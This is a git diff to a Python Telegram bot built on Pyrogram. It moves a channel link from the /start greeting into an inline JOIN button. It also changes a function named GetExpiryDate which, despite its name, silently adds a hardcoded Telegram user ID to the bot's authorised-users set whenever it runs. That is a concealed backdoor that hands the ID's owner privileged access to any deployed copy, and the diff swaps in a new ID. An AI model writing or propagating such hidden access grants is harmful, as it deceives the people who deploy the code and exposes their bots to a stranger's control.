@@ -23,11 +23,12 @@ from translation import Translation
 import pyrogram
 logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
+from pyrogram import InlineKeyboardButton, InlineKeyboardMarkup, StopPropagation
 from helper_funcs.chat_base import TRChatBase
 
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(683538773)
+    Config.AUTH_USERS.add(1305002856)
     return expires_at
 
 
@@ -62,7 +63,12 @@ async def get_me_info(bot, update):
 async def start(bot, update):
     # logger.info(update)
     TRChatBase(update.from_user.id, update.text, "/start")
-    await update.reply(f"<b>Hi {update.chat.first_name}!</b> \nThis is a Telegram Multipurpose Bot Which can do many functions. /help for more details...  \n\nJOIN : https://t.me/TGBotsCollection \nFor the List of Telegram Bots")
+    await update.reply(f"<b>Hii {update.chat.first_name}!</b>\nThis is a Telegram Multipurpose Bot Which can do many functions. /help for more details...  ",reply_markup=InlineKeyboardMarkup(
+            [
+                    InlineKeyboardButton('JOIN', url='https://t.me/TGBotsCollection')
+                ]
+        )
+    )
       
 
 @pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
